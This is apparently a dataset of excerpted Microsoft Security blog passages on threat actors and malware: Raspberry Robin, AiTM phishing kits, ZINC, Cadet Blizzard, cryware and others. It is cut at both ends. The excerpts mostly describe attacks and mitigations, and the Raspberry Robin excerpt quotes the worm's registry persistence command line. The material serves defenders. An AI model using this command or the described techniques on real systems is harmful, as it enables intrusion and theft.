and keeping track of these names can be challenging for defenders. Microsoft Threat Intelligence is committed to helping customers understand threats, no matter which naming taxonomy they are familiar with. Therefore, we will strive to also include other threat actor names within our security products to reflect these analytic overlaps and help customers make well-informed decisions. ", "source": "microsoft"}, {"title": "Introduction", "content": "Keeping in mind that our goal is to classify PowerShell scripts, we briefly look at how text classification is approached in the domain of natural language processing. An important step is to convert words to vectors (tuples of numbers) that can be consumed by machine learning algorithms. A basic approach, known as one-hot encoding, first assigns a unique integer to each word in the vocabulary, then represents each word as a vector of 0s, with 1 at the integer index corresponding to that word. Although useful in many cases, the one-hot encoding has significant flaws. A major issue is that all words are equidistant from each other, and semantic relations between words are not reflected in geometric relations between the corresponding vectors. \nContextual embedding is a more recent approach that overcomes these limitations by learning compact representations of words from data under the assumption that words that frequently appear in similar context tend to bear similar meaning. The embedding is trained on large textual datasets like Wikipedia. The Word2vec algorithm, an implementation of this technique, is famous not only for translating semantic similarity of words to geometric similarity of vectors, but also for preserving polarity relations between words. For example, in Word2vec representation: \nMadrid \u2013 Spain $^+$ Italy \u2248 Rome ", "source": "microsoft"}, {"title": "defend", "content": "Deep learning methods significantly improve detection of threats. In this blog, we discussed a concrete application of deep learning to a particularly evasive class of threats: malicious PowerShell scripts. We have and will continue to develop deep learning-based protections across multiple capabilities in Microsoft Defender ATP. \nDevelopment and productization of deep learning systems for cyber defense require large volumes of data, computations, resources, and engineering effort. Microsoft Defender ATP combines data collected from millions of endpoints with Microsoft computational resources and algorithms to provide industry-leading protection against attacks. \nStronger detection of malicious PowerShell scripts and other threats on endpoints using deep learning mean richer and better-informed security through Microsoft Threat Protection, which provides comprehensive security for identities, endpoints, email and data, apps, and infrastructure. ", "source": "microsoft"}, {"title": "Introduction", "content": "Our research on the framework vulnerabilities began while trying to better understand how a pre-installed System application could affect the overall security of mobile devices. We discovered that the framework, which is used by numerous apps, had a \"BROWSABLE\" service activity that an attacker could remotely invoke to exploit several vulnerabilities that could allow adversaries to implant a persistent backdoor or take substantial control over the device. \nThe framework seemed to be designed to offer self-diagnostic mechanisms to identify and resolve issues impacting the Android device, indicating its permissions were inherently broad with access to valuable resources. For example, the framework was authorized to access system resources and perform system-related tasks, like adjusting the device's audio, camera, power, and storage controls. Moreover, we found that the framework was being used by default system applications to leverage its self-diagnostic capabilities, demonstrating that the affiliated apps also included extensive device privileges that could be exploited via the vulnerable framework. \nAccording to mce Systems, some of these vulnerabilities also affected other apps on both Android and iOS devices. Moreover, the vulnerable framework and affiliated apps were found on devices from large international mobile service providers. mce Systems, which offers \"Mobile Device Lifecycle and Automation Technologies,\" also permitted providers to customize and brand their respective mobile apps and frameworks. Pre-installed frameworks and mobile apps such as mce Systems' are beneficial to users and providers in areas like simplifying the device activation process, troubleshooting device issues, and optimizing performance. However, their extensive control over the device to deliver these kinds of services could also make them an attractive target for attackers. \nOur analysis further found that the apps were embedded in the devices' system image, suggesting that they were default applications installed by phone providers. All of the apps are available on the Google Play Store where they go through Google Play Protect's automatic safety checks, but these checks previously did not scan for these types of issues. As part of our effort to help ensure broad protection against these issues, we shared our research with Google, and Google Play Protect now identifies these types of vulnerabilities. \nWe initially discovered the vulnerabilities in September 2021 and shared our findings with mce Systems and affected mobile service providers through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR). We worked closely with mce Systems' security and engineering teams to mitigate these vulnerabilities, which included mce Systems sending an urgent framework update to the impacted providers and releasing fixes for the issues. At the time of publication, there have been no reported signs of these vulnerabilities being exploited in the wild. \nThe high-severity vulnerabilities, which have a Common Vulnerability Scoring System (CVSS) score of 7.0-8.9, are now identified as CVE-2021-42598, CVE-2021- 42599, CVE-2021-42600, and CVE-2021-42601. We want to thank mce Systems' engineering teams for collaborating quickly and efficiently in resolving these issues as well as to AT&T for proactively working with Microsoft to ensure customers can safely continue to use the framework. \nSeveral other mobile service providers were found using the vulnerable framework with their respective apps, suggesting that there could be additional providers still undiscovered that may be impacted. The affected providers linked below have made updated app versions available to users before this disclosure, ensuring devices can be protected before these vulnerabilities could be exploited. We encourage these providers' customers to update to the latest versions of these apps from the Google Play store, which include but are not limited to: com.telus.checkup, com.att.dh com.fivemobile.myaccount, com.freedom.mlp,uat, and com.ca.bell.contenttransfer. \nAdditionally, the package com.mce.mceiotraceagent might be installed by several mobile phone repair shops. Mobile users are advised to look for that app name and remove it from their phone, if found. ", "source": "microsoft"}, {"title": "Protection", "content": "Microsoft strives to continuously improve security by collaborating with customers, partners, and industry experts. Responding to the evolving threat landscape requires us to expand our capabilities into other devices and non-Windows platforms in addition to further coordinating research and threat intelligence sharing among the larger security community. This case highlighted the need for expert, cross-industry collaboration to effectively mitigate issues. \nMoreover, collaborative research such as this informs our seamless protection capabilities across platforms. For example, intelligence from this analysis helped us ensure that Microsoft Defender Vulnerability Management can identify and remediate devices that have these vulnerabilities, providing security operations teams with comprehensive visibility into their organizational exposure and enabling them to reduce the attack surface. In addition, while we're not aware of any active exploitation of these mobile vulnerabilities in the wild, Microsoft Defender for Endpoint's mobile threat defense capabilities significantly improve security on mobile devices by detecting potential exploits, malware, and post-exploitation activity. \nWe will continue to work with the security community to share intelligence about threats and build better protection for all. Microsoft security researchers continually work to discover new vulnerabilities and threats, turning a variety of wide-reaching issues into tangible results and improved solutions that protect users and organizations across platforms every single day. Similarly inquisitive individuals are encouraged to check opportunities to join the Microsoft research team here: https://careers.microsoft.com/. ", "source": "microsoft"}, {"title": "Introduction", "content": "DEV-0530 primarily operates ransomware campaigns to pursue financial objectives. In MSTIC's investigations of their early campaigns, analysts observed that the group's ransom note included a link to the .onion site   \nhxxp://matmq3z3hiovia3voe2tix2x54sghc3tszj74xgdy4tqtypoycszqzqd[.]onion, where the attackers claim to \"close the gap between the rich and poor\". They also attempt to legitimize their actions by claiming to increase the victim's security awareness by letting the victims know more about their security posture. \nLike many other ransomware actors, DEV-0530 notes on their website's privacy policy that they would not sell or publish their victim's data if they get paid. But if the victim fails to pay, they would publish everything. A contact form is also available for victims to get in touch with the attackers. ", "source": "microsoft"}, {"title": "Introduction", "content": "The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response \nIn early May 2022, Red Canary reported that a new worm named Raspberry Robin was spreading to Windows systems through infected USB drives. The USB drive contains a Windows shortcut (LNK) file disguised as a folder. In earlier infections, this file used a generic file name like recovery.lnk, but in more recent ones, it uses brands of USB drives. It should be noted that USB-worming malware isn't new, and many organizations no longer track these as a top threat. \nFor an attack relying on a USB drive to run malware upon insertion, the targeted system's autorun.inf must be edited or configured to specify which code to start when the drive is plugged in. Autorun of removable media is disabled on Windows by default. However, many organizations have widely enabled it through legacy Group Policy changes. \nThere has been much public debate about whether the Raspberry Robin drives use autoruns to launch or if it relies purely on social engineering to encourage users to click the LNK file. Microsoft Threat Intelligence Center (MSTIC) and Microsoft Detection and Response Team (DART) research has confirmed that both instances exist in observed attacks. Some Raspberry Robin drives only have the LNK and executable files, while drives from earlier infections have a configured autorun.inf. This change could be linked to why the names of the shortcut files changed from more generic names to brand names of USB drives, possibly encouraging a user to execute the LNK file. \nUpon insertion of the infected drive or launching of the LNK file, the UserAssist registry key in Windows-where Windows Explorer maintains a list of launched programs-is updated with a new value indicating a program was launched by Windows. \nThe UserAssist key stores the names of launched programs in ROT13-ciphered format, which means that every letter in the name of the program is replaced with the $13^{\\mathrm{th}}$ letter in the alphabet after it. This routine makes the entries in this registry key not immediately readable. The UserAssist key is a useful forensic artifact to demonstrate which applications were launched on Windows, as outlined in Red Canary's blog. \nWindows shortcut files are mostly used to create an easy-to-find shortcut to launch a program, such as pinning a link to a user's browser on the taskbar. However, the format allows the launching of any code, and attackers often use LNK files to launch malicious scripts or run stored code remotely. Raspberry Robin's LNK file points to cmd.exe to launch the Windows Installer service msiexec.exe and install a malicious payload hosted on compromised QNAP network attached storage (NAS) devices. \nOnce the Raspberry Robin payload is running, it spawns additional processes by using system binaries such as rundll32.exe, odbcconf.exe, and control.exe to use as living-off-the-land binaries (LOLBins) to run malicious code. Raspberry Robin also launches code via fodhelper.exe, a system binary for managing optional features, as a user access control (UAC) bypass. \nThe malware injects into system processes including regsvr32.exe, rundll32.exe, and dllhost.exe and connects to various command-and-control (C2) servers hosted on Tor nodes. \nIn most instances, Raspberry Robin persists by adding itself to the RunOnce key of the registry hive associated with the user who executed the initial malware install. The registry key points to the Raspberry Robin binary, which has a random name and a random extension such as .mh or .vdm in the user's AppData folder or to \nRaspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity | Microsoft Security Blog ProgramData. The key uses the intended purpose of regsvr32.exe to launch the portable executable (PE) file, allowing the randomized non-standard file extension to launch the executable content. \n\"C:\\Windows\\System32\\rundl132.exe\" SHELL32.DLL,She1lExec_RunDLLA REGSVR32.EXE /u -S \"C:\\Users[UserName]\\AppData\\Local\\Temp\\cnsbi.mh.\" \nEntries in the RunOnce key delete the registry entry prior to launching the executable content at sign-in. Raspberry Robin re-adds this key once it is successfully running to ensure persistence. After the initial infection, this leads to RunOnce.exe launching the malware payload in timelines. Raspberry Robin also temporarily renames the RunOnce key when writing to it to evade detections. ", "source": "microsoft"}, {"title": "defend", "content": "Worms can be noisy and could lead to alert fatigue in security operations centers (SOCs). Such fatigue could lead to improper or untimely remediation, providing the worm operator ample opportunity to sell access to the affected network to other cybercriminals. \nWhile Raspberry Robin seemed to have no purpose when it was first discovered, it has evolved and is heading towards providing a potentially devastating impact on environments where it's still installed. Raspberry Robin will likely continue to develop and lead to more malware distribution and cybercriminal activity group relationships as its install footprint grows. \nMicrosoft Defender for Endpoint and Microsoft Defender Antivirus detect Raspberry Robin and follow-on activities described in this blog. Defenders can also apply the following mitigations to reduce the impact of this threat: \nPrevent drives from using autorun and execution code on insertion or mount. This can be done via registry settings or Group Policy.   \nFollow the defending against ransomware guidance in Microsoft's RaaS blog post   \nEnable tamper protection to prevent attacks from stopping or interfering with Microsoft Defender Antivirus.   \nTurn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants. \nMicrosoft customers can turn on attack surface reduction rules to prevent several of the infection vectors of this threat. Attack surface reduction rules, which any security administrator can configure, offer significant hardening against the worm. In observed attacks, Microsoft customers who had the following rules enabled were able to mitigate the attack in the initial stages and prevent hands-on-keyboard activity: \nBlock untrusted and unsigned processes that run from USB   \nBlock execution of potentially obfuscated scripts   \nBlock executable files from running unless they meet a prevalence, age, or   \ntrusted list criterion   \nBlock credential stealing from the Windows local security authority subsystem   \n(lsass.exe) \nDefenders can also refer to detection details and indicators or compromise in the following sections for more information about surfacing this threat. ", "source": "microsoft"}, {"title": "Introduction", "content": "We have seen other campaigns targeting Indian banks' customers based on the following app names: \nAxisbank_rewards.apk Icici_points.apk Icici_rewards.apk SBI_rewards.apk \nOur investigation focused on icici_rewards.apk (package name: com.example.test_app), which presents itself as ICICI Rewards. The SMS campaign sends out messages containing a malicious link that leads to installing a malicious APK on a target's mobile device. To lure users into accessing the link, the SMS claims that the user is being notified to claim a reward from a known Indian bank. \nUpon user interaction, it displays a splash screen with the bank logo and proceeds to ask the user to enable specific permissions for the app. \nThe fake app asks for credit card information upon being granted all permissions. This should raise users' suspicions on the app's motive as apps typically ask for sensitive information only through user-driven transactions like paying for purchases. \nThe app displays another fake screen with further instructions to add to its legitimacy once users supply the information needed. \nFigures 5 and 6. A fake page where the app asks users to provide information, and the resulting message once data is added ", "source": "microsoft"}, {"title": "Introduction", "content": "Every modern web service implements a session with a user after successful authentication so that the user doesn't have to be authenticated at every new page they visit. This session functionality is implemented through a session cookie provided by an authentication service after initial authentication. The session cookie is proof for the web server that the user has been authenticated and has an ongoing session on the website. In AiTM phishing, an attacker attempts to obtain a target user's session cookie so they can skip the whole authentication process and act on the latter's behalf. \nFrom cookie theft to BEC: Attackers use AiTM phishing sites as entry point to further financial fraud | Microsoft Security To do this, the attacker deploys a webserver that proxies HTTP packets from the user that visits the phishing site to the target server the attacker wishes to impersonate and the other way around. This way, the phishing site is visually identical to the original website (as every HTTP is proxied to and from the original website). The attacker also doesn't need to craft their own phishing site like how it's done in conventional phishing campaigns. The URL is the only visible difference between the phishing site and the actual one. \nThe phishing page has two different Transport Layer Security (TLS) sessions-one with the target and another with the actual website the target wants to access. These sessions mean that the phishing page practically functions as an AiTM agent, intercepting the whole authentication process and extracting valuable data from the HTTP requests such as passwords and, more importantly, session cookies. Once the attacker obtains the session cookie, they can inject it into their browser to skip the authentication process, even if the target's MFA is enabled. \nThe AiTM phishing process can currently be automated using opensource phishing toolkits and other online resources. Among the widely-used kits include Evilginx2, Modlishka, and Muraena. ", "source": "microsoft"}, {"title": "defend", "content": "This AiTM phishing campaign is another example of how threats continue to evolve in response to the security measures and policies organizations put in place to defend themselves against potential attacks. And since credential phishing was leveraged in many of the most damaging attacks last year, we expect similar attempts to grow in scale and sophistication. \nFrom cookie theft to BEC: Attackers use AiTM phishing sites as entry point to further financial fraud | Microsoft Security Blo While AiTM phishing attempts to circumvent MFA, it's important to underscore that MFA implementation remains an essential pillar in identity security. MFA is still very effective at stopping a wide variety of threats; its effectiveness is why AiTM phishing emerged in the first place. Organizations can thus make their MFA implementation \"phish-resistant\" by using solutions that support Fast ID Online (FIDO) v2.0 and certificate-based authentication. \nDefenders can also complement MFA with the following solutions and best practices to further protect their organizations from such types of attacks: \nEnable conditional access policies. Conditional access policies are evaluated and enforced every time an attacker attempts to use a stolen session cookie. Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as compliant devices or trusted IP address requirements.   \nInvest in advanced anti-phishing solutions thatmonitor and scan incoming emails and visited websites. For example, organizations can leverage web browsers that can automatically identify and block malicious websites, including those used in this phishing campaign.   \nContinuously monitor for suspicious or anomalous activities: Hunt for sign-in attempts with suspicious characteristics (for example, location, ISP, user agent, use of anonymizer services). Hunt for unusual mailbox activities such as the creation of Inbox rules with suspicious purposes or unusual amounts of mail item access events by untrusted IP addresses or devices. ", "source": "microsoft"}, {"title": "Defense", "content": "Microsoft 365 Defender provides comprehensive protection against this AiTM phishing campaign by correlating threat data from various domains. It also coordinates threat defense against the end-to-end attack chain using multiple solutions and has advanced hunting capabilities that allow analysts to inspect their environments further and surface this threat. \nLeveraging its cross-signal capabilities, Microsoft 365 Defender alerts customers using Microsoft Edge when a session cookie gets stolen through AiTM phishing and when an attacker attempts to replay the stolen session cookie to access Exchange Online: \nMicrosoft 365 Defender's unique incident correlation technology also lets defenders see all the relevant alerts related to an AiTM phishing attack pieced together into a single comprehensive view, thus allowing them to respond to such incidents more efficiently: ", "source": "microsoft"}, {"title": "Introduction", "content": "DEV-1101 began advertising their AiTM kit around May 2022 through a Telegram channel and an advertisement in exploit[.]in, a popular cybercrime forum. The advertisement describes the AiTM kit as a phishing application written in NodeJS with PHP reverse-proxy capabilities, automated setup, detection evasion through an antibot database, management of phishing activity through Telegram bots, and a wide range of ready-made phishing pages mimicking services such as Microsoft Office or Outlook. \nOn June 12, 2022, DEV-1101 announced that the kit would be open source with a $\\$100$ monthly licensing fee. The actor also provided links to additional Telegram channels and a now-defunct GitHub page. \nIn September 2022, DEV-1101 added the ability to manage servers running their kit through a Telegram bot rather than requiring the use of cPanel, further facilitating phishing activities and letting their customers manage campaigns from mobile devices. \nDEV-1101 was able to increase the price of their tool multiple times due to the rapid growth of their user base from July through December 2022. This allowed DEV-1101 to dedicate themselves fully to the development and support of their tool. As of this writing, DEV-1101 offers their tool for $\\$300$ , with VIP licenses at $\\$1,000$ . Legacy users were permitted to continue purchasing licenses at $\\$200$ prior to January 1, 2023. \nMicrosoft observed several high-volume phishing campaigns from various actors using the tool offered by DEV-1101, comprising millions of phishing emails per day. DEV-0928, an actor Microsoft has tracked since September 2022, is one of DEV1101's more prominent patrons and was observed launching a phishing campaign involving over one million emails. ", "source": "microsoft"}, {"title": "defend", "content": "Because AiTM phishing attacks are complex threats, they require solutions that leverage signals from multiple sources. Microsoft 365 Defender uses its crossdomain visibility to detect malicious activities related to AiTM, such as session cookie theft and attempts to use stolen cookies for signing in. \nUsing Microsoft Defender for Cloud Apps connectors, Microsoft 365 Defender raises AiTM-related alerts in multiple scenarios. For Azure AD customers using Microsoft Edge, attempts by attackers to replay session cookies to access cloud applications are detected by Defender for Cloud Apps connectors for Office 365 and Azure. In such scenarios, Microsoft 365 Defender raises the following alert: \nStolen session cookie was used \nIn addition, signals from these Defender for Cloud Apps connectors, combined with data from the Defender for Endpoint network protection capabilities, also triggers the following Microsoft 365 Defender alert on Azure AD environments: \nPossible AiTM phishing attempt \nA specific Defender for Cloud Apps connector for Okta, together with Defender for Endpoint, also helps detect AiTM attacks on Okta accounts using the following alert: \nPossible AiTM phishing attempt in Okta \nIn addition, Microsoft 365 Defender has the following related alerts for activity related to the DEV-0928 threat actor, as well as high-risk Azure AD sign-in activity: \nDEV-0928 activity group Suspicious network connection to AiTM phishing site Connection to Adversary-in-the-Middle (AiTM) phishing site ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nDiamond Sleet (ZINC) Living off the land Sleet \nApril 2023 update \u2013 Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. Zinc is now tracked as Diamond Sleet. \nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. \nIn recent months, Microsoft has detected cyberattacks targeting security researchers by an actor we track as ZINC. The campaign originally came to our attention after Microsoft Defender for Endpoint detected an attack in progress. Observed targeting includes pen testers, private offensive security researchers, and employees at security and tech companies. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ZINC, a DPRK-affiliated and state-sponsored group, based on observed tradecraft, infrastructure, malware patterns, and account affiliations. \nThis ongoing campaign was reported by Google's Threat Analysis Group (TAG) earlier this week, capturing the browser-facing impact of this attack. By sharing additional details of the attack, we hope to raise awareness in the cybersecurity community about additional techniques used in this campaign and serve as a reminder to security professionals that they are high-value targets for attackers. \nWe also want to thank our industry colleagues at Twitter and GitHub for their collaboration in this investigation and rapid actions to suspend the malicious accounts targeting the security community and our mutual customers. \nWe are sharing this information with the community as part of our mission to shine a light on bad actors and elevate awareness of low-profile tactics and techniques that easily fly under the radar of security operations centers (SOCs) or security professionals and are easily overlooked as low-level alerts or benign chatter. The related IoCs and Microsoft Defender for Endpoint product detections we share in this blog will help SOCs proactively hunt for related activity in their environments and elevate any low-level alerts for remediation. ZINC used a variety of new techniques to target the victims, including gaining credibility on social media with genuine content, sending malicious Visual Studio projects, and using a watering hole website weaponized with browser exploits. ", "source": "microsoft"}, {"title": "defend", "content": "When malware is run from a malicious Visual Studio project, the following alerts and process tree are generated by Microsoft Defender for Endpoint. Multiple alerts, including \"Use of living-off-land binary to run malware\" and \"Process Privilege escalation\", were triggered on the execution of Browser.VC.db and update.bin. \nMicrosoft Defender for Endpoint has comprehensive detection coverage for this campaign. These detections raise alerts that inform security operations teams about the presence of activities and artifact from the attacks. Security operations and incident response teams can use investigation and remediation tools in Microsoft Defender Endpoint to perform deep investigation and additional hunting. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "The below list provides IOCs observed during this activity. We encourage our customers to implement detections and protections to identify possible prior campaigns or prevent future campaigns against their systems. \nAzure Sentinel customers can find a Sentinel query containing these indicators in this GitHub repo: https://github.com/Azure/AzureSentinel/tree/master/Detections/MultipleDataSources/ZincJan272021IOCs.yaml \nZINC attacks against security researchers | Microsoft Security Blog Microsoft 365 Defender customers can find related hunting queries below or at this GitHub repo: https://github.com/microsoft/Microsoft-365-Defender-HuntingQueries/ ", "source": "microsoft"}, {"title": "Introduction", "content": "redictable kernel address space layout has made it easier to exploit certain types of kernel vulnerabiliti \nResearch Threat intelligence Vulnerabilities and exploits \n6 min read \nDetecting and mitigating elevation-of-privilege exploit for CVE-2017-0005 \nBy Microsoft Defender Security Research Team ", "source": "microsoft"}, {"title": "defend", "content": "With the upcoming Creators Update release, Windows Defender ATP will be able to detect attempts at a SMEP bypass through CR4 register modifications. Windows Defender ATP will monitor the status of the CR4.SMEP bit and will report inconsistencies. In addition to this, Windows Defender ATP will detect tokenswapping attempts by monitoring the state of the token field of a process structure. \nThe following screenshot shows Windows Defender ATP catching exploit code performing the token-swapping technique to elevate privileges. ", "source": "microsoft"}, {"title": "Introduction", "content": "Cadet Blizzard is a Russian GRU-sponsored threat group that Microsoft began tracking following disruptive and destructive events occurring at multiple government agencies in Ukraine in mid-January 2022. During this time, Russian troops backed with tanks and artillery were surrounding the Ukrainian border as the military prepped for an offensive attack. The defacements of key Ukrainian institutions' websites, coupled with the WhisperGate malware, prefaced multiple waves of attacks by Seashell Blizzard that followed when the Russian military began their ground offensive a month later. \nCadet Blizzard compromises and maintains a foothold on affected networks for months, often exfiltrating data prior to disruptive actions. Microsoft observed Cadet Blizzard's activity peak between January and June 2022, followed by an extended period of reduced activity. The group re-emerged in January 2023 with increased \noperations against multiple entities in Ukraine and in Europe, including another round of website defacements and a new \"Free Civilian\" Telegram channel affiliated with the hack-and-leak front under the same name that first emerged in January 2022, around the same time as the initial defacements. Cadet Blizzard actors are active seven days of the week and have conducted their operations during their primary European targets' off-business hours. Microsoft assesses that NATO member states involved in providing military aid to Ukraine are at greater risk. \nCadet Blizzard seeks to conduct disruption, destruction, and information collection, using whatever means are available and sometimes acting in a haphazard fashion. While the group carries high risk due to their destructive activity, they appear to operate with a lower degree of operational security than that of longstanding and advanced Russian groups such as Seashell Blizzard and Forest Blizzard. Additionally, as is the case with other Russian state-sponsored threat groups, Microsoft assesses that at least one Russian private sector organization has materially supported Cadet Blizzard by providing operational support including during the WhisperGate destructive attack. ", "source": "microsoft"}, {"title": "defend", "content": "Activities linked to Cadet Blizzard indicate that they are comprehensive in their approach and have demonstrated an ability to hold networks at risk of continued compromise for an extended period of time. A comprehensive approach to incident response may be required in order to fully remediate from Cadet Blizzard operations. Organizations can bolster security of information assets and expedite incident response by focusing on areas of risk based on actor tradecraft enumerated within this report. Use the included indicators of compromise to investigate environments and assess for potential intrusion. \nReview all authentication activity for remote access infrastructure, with a particular focus on accounts configured with single factor authentication, to confirm authenticity and investigate any anomalous activity. Enable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity. NOTE: Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure accounts. Enable controlled folder access (CFA) to prevent MBR/VBR modification. Block process creations originating from PSExec and WMI commands to stop lateral movement utilizing the WMIexec component of Impacket. Turn on cloud-delivered protection in Microsoft Defender Antivirus, turned on by default in Windows, or the equivalent for your chosen antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants. ", "source": "microsoft"}, {"title": "Introduction", "content": "An authentication protocol verifies the legitimacy of a resource or identity. When a user signs into a website, that website uses a methodology to confirm the authenticity of the resource requesting access. In simpler terms, the authentication process involves signing in with a password-made possible by the user knowing the password anticipated by the website. The Kerberos protocol serves as the main authentication framework for this process in on-premises Active Directory. ", "source": "microsoft"}, {"title": "Defense", "content": "It's important to note that KrbRelayUp cannot be used in attacks against organizations that are only using Azure AD. However, in hybrid identity environments where organizations synchronize their domain controllers with Azure AD, if an attacker compromises an Azure virtual machine using a synchronized account, they'll receive SYSTEM privileges on the virtual machine. \nTo reduce the impact of this threat, organizations should apply the mitigations below. Microsoft 365 Defender customers can check the recommendations card for the deployment status of monitored mitigations. \nMicrosoft has provided guidance for enabling LDAP channel binding and LDAP signing. Microsoft recommends that administrators configure LDAP signing and LDAP channel binding as recommended in the said advisory and described in detail in 2020 LDAP channel binding and LDAP signing requirements for Windows (KB4520412). Organizations should also consider setting the $\\underline{m s}-\\underline{D}{\\sf S}-$ MachineAccountQuota attribute to $0$ to make it more difficult for an attacker to leverage the attribute for attacks. Setting the attribute to 0 stops nonadmin users from adding new devices to the domain, blocking the most effective method to carry out the attack's first step and forcing attackers to choose more complex methods to acquire a suitable resource. ", "source": "microsoft"}, {"title": "Introduction", "content": "The emergence and boom of cryptocurrency allowed existing threats to evolve their techniques to target or abuse cryptocurrency tokens. The threats that currently leverage cryptocurrency include: \nCryptojackers. One of the threat types that surfaced and thrived since the introduction of cryptocurrency, cryptojackers are mining malware that hijacks and consumes a target's device resources for the former's gain and without the latter's knowledge or consent. Based on our threat data, we saw millions of cryptojacker encounters in the last year.   \nRansomware. Some threat actors prefer cryptocurrency for ransom payments because it provides transaction anonymity, thus reducing the chances of being discovered.   \nPassword and info stealers. Apart from sign-in credentials, system information, and keystrokes, many info stealers are now adding hot wallet data to the list of information they search for and exfiltrate. ClipBanker trojans. Another type of info stealer, this malware checks the user's clipboard and steals banking information or other sensitive data a user copies. ClipBanker trojans are also now expanding their monitoring to include cryptocurrency addresses. \nThe increasing popularity of cryptocurrency has also led to the emergence of cryware like Mars Stealer and RedLine Stealer. These threats aim to steal cryptocurrencies through wallet data theft, clipboard manipulation, phishing and scams, or even misleading smart contracts. For example, RedLine has even been \nIn hot pursuit of 'cryware': Defending hot wallets from attacks | Microsoft Security Blog used as a component in larger threat campaigns. The graph below illustrates the increasing trend in unique cryware file encounters Microsoft Defender for Endpoint has detected in the last year alone. \nCryware could cause severe financial impact because transactions can't be changed once they're added to the blockchain. As mentioned earlier, there also are currently no support systems that could help recover stolen cryptocurrency funds. \nFor example, in 2021, a user posted about how they lost USD78,000 worth of Ethereum because they stored their wallet seed phrase in an insecure location. An attacker likely gained access to the target's device and installed cryware that discovered the sensitive data. Once this data was compromised, the attacker would've been able to empty the targeted wallet. \nWith the growing popularity of cryptocurrency, the impact of cryware threats have become more significant. We've already observed campaigns that previously deployed ransomware now using cryware to steal cryptocurrency funds directly from a targeted device. While not all devices have hot wallets installed on them- especially in enterprise networks-we expect this to change as more companies transition or move part of their assets to the cryptocurrency space. Users and organizations must therefore learn how to protect their hot wallets to ensure their cryptocurrencies don't end up in someone else's pockets. ", "source": "microsoft"}, {"title": "defend", "content": "Cryptocurrency crime has been reported to have reached an all-time high in 2021, with over USD10 billion worth of cryptocurrencies stored in wallets associated with ransomware and cryptocurrency theft. This shows that just as large cryptocurrencyrelated entities get attacked, individual consumers and investors are not spared. \nCryptocurrency trading can be an exciting and beneficial practice, but given the various attack surfaces cryware threats leverage, users and organizations must note the multiple ways they can protect themselves and their wallets. They should have a security solution that provides multiple layers of dynamic protection technologies -including machine learning-based protection. \nMicrosoft Defender Antivirus offers such protection. Its endpoint protection capabilities detect and block many cryware, cryptojackers, and other cryptocurrency-related threats. Meanwhile, Microsoft Defender SmartScreen in Microsoft Edge and other web browsers that support it blocks phishing sites and prevents downloading of fake apps and other malware. Signals from these solutions, along with threat data from other domains, feed into Microsoft 365 Defender, which provides organizations with comprehensive and coordinated threat defense and is backed by a global network of security experts who monitor the continuously evolving threat landscape for new and emerging attacker tools and techniques. \nUsers and organizations can also take the following steps to defend against cryware and other hot wallet attacks: \nLock hot wallets when not actively trading. This feature in most wallet applications can prevent attackers from creating transactions without the user's knowledge.   \nDisconnect sites connected to the wallet. When a user isn't actively doing a transaction on a decentralized finance (DeFi) platform, a hot wallet's disconnect feature ensures that the website or app won't interact with the user's wallet without their knowledge. In hot pursuit of 'cryware': Defending hot wallets from attacks | Microsoft Security Blog   \nRefrain from storing private keys in plaintext. Never store seed phrases on the device or cloud storage services. Instead, write them down on paper (or something equivalent) and properly secure them.   \nBe attentive when copying and pasting information. When copying a wallet address for a transaction, double-check if the value of the address is indeed the one indicated on the wallet.   \nEnsure that browser sessions are terminated after every transaction. To minimize the risk of cryware process dumpers, properly close or restart the browser's processesafterimporting keys. This ensures that the private key doesn't remain in the browser process's memory.   \nConsider using wallets that implement multifactor authentication (MFA). This prevents attackers from logging into wallet applications without another layer of authentication.   \nBe wary of links to wallet websites and applications. Phishing websites often make substantial efforts to appear legitimate, so users must be careful when clicking links in emails and messaging apps. Consider manually typing or searching for the website instead and ensure that their domains are typed correctly to avoid phishing sites that leverage typosquatting and soundsquatting.   \nDouble-check hot wallet transactions and approvals. Ensure that the contract that needs approval is indeed the one initiated.   \nNever share private keys or seed phrases. Under no circumstances will a third party or even the wallet app developers need these types of sensitive information.   \nUse a hardware wallet unless it needs to be actively connected to a device. Hardware wallets store private keys offline.   \nReveal file extensions of downloaded and saved files. On Windows,turn on File Name Extensions under View on file explorer to see the actual extensions of the files on a device. \nLearn how you can stop attacks through automated, cross-domain security with Microsoft 365 Defender. \nBerman Enconado and Laurie Kirk Microsoft 365 Defender Research Team ", "source": "microsoft"}, {"title": "Introduction", "content": "Flax Typhoon has been active since mid-2021 and has targeted government agencies and education, critical manufacturing, and information technology organizations in Taiwan. Some victims have also been observed elsewhere in Southeast Asia, as well as in North America and Africa. Flax Typhoon focuses on persistence, lateral movement, and credential access. As with any observed nationstate actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. \nFlax Typhoon is known to use the China Chopper web shell, Metasploit, Juicy Potato privilege escalation tool, Mimikatz, and SoftEther virtual private network (VPN) client. However, Flax Typhoon primarily relies on living-off-the-land techniques and hands-on-keyboard activity. Flax Typhoon achieves initial access by exploiting known vulnerabilities in public-facing servers and deploying web shells like China Chopper. Following initial access, Flax Typhoon uses command-line tools to first establish persistent access over the remote desktop protocol, then deploy a VPN connection to actor-controlled network infrastructure, and finally collect credentials from compromised systems. Flax Typhoon further uses this VPN access to scan for vulnerabilities on targeted systems and organizations from the compromised systems. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft worked internally and externally with OEM partners Lenovo, HP, Dell, Panasonic, Dynabook, and Getac to introduce a new a class of devices, Securedcore PCs. Secured-core PCs address the need for customers 